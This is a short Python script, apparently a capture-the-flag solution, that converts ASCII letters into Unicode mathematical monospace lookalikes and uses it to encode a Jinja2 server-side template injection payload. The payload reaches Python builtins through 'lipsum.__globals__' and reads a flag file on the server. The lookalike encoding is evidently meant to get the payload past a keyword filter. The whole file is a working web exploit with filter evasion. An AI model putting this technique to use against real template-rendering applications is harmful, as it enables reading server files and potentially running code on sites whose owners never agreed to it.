import unicodedata

def to_mono(text):
    result = ""
    for char in text:
        code = ord(char)

        if 97 <= code <= 122:
            result += chr(0x1D68A + (code - 97))
        elif 65 <= code <= 90:
            result += chr(0x1D670 + (code - 65))
        else:
            result += char

    return result

raw_payload = '{{ lipsum.__globals__.__builtins__.open("/home/hangul/flag").read() }}'
encoded_payload = to_mono(raw_payload)
print(encoded_payload)